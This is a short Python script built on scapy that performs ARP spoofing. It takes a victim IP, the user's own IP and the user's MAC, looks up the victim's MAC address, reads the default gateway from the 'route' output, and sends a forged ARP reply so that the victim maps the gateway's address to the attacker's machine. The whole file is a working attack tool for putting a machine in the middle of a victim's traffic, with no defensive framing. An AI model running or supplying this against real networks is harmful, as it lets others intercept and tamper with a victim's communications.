import subprocess
import sys
from scapy.all import *

if len(sys.argv) != 4:
	print "Usage: python argv.py VICT_IP MY_IP MY_MAC"
	sys.exit(1)

############# mapping argvs
VICT_IP = sys.argv[1]
MY_IP = sys.argv[2]
MY_MAC = sys.argv[3]

############# ARP request
arp_packet = sr1(ARP(op=ARP.who_has, psrc = MY_IP, pdst=VICT_IP))
summary=arp_packet.summary()
summary_split = summary.split()
vict_MAC = summary_split[summary_split.index('at')+1] ## get mac

print "vict_MAC: " +  vict_MAC

############# get gateway IP addr
output= subprocess.check_output(["route"])
output_split = output.split()
gateway = output_split[output_split.index('default') +1]

print "gateway IP: " + gateway

############# send spoofed ip
arp_reply = ARP(op=ARP.is_at, hwsrc = MY_MAC, 
		psrc=gateway, hwdst=vict_MAC, pdst=VICT_IP)
send(arp_reply)



